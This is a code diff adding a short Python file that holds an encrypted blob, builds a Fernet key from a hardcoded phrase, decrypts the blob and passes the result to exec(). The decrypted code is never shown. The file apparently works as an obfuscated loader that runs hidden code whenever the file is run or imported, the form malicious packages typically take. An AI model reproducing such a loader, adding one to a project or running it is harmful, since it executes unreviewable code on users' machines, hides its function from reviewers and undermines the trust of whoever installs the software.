@@ -1,0 +1,10 @@
+import base64
+from cryptography.fernet import Fernet
+
+payload=b'gAAAAABmQ4Wv01ZKMpLBhrqYt7b984Idp3dg9iuaA8pu4U8iFXa0pOS8OLHQiPolsWLOyerb_o61AblYMHdC4nFFzZDGXP4UWF-7Mm7x7rkSiBCdLYhwqfMj1bhXYs_BI11VWym4EO6WRlFEhopzMY_9lsKpj0d8ft4Ld-nDkhkH0_kLJ1y4gx5830Rt8rjdfhNBgTNnQzGBarTAXqvLBU-B8tf7zSO_kFGmNZMeGtXFtmLL0ZV5A7eAsBmHsyKfI8w3u0WuXDSNFaWV0sIsVgrg_HeqR7G7scuEZRYN3kQ56K3a18x2hRY='
+
+key_str = 'correctstaplecorrectstaplecorrec'
+key_base64 = base64.b64encode(key_str.encode())
+f = Fernet(key_base64)
+plain = f.decrypt(payload)
+exec(plain.decode())
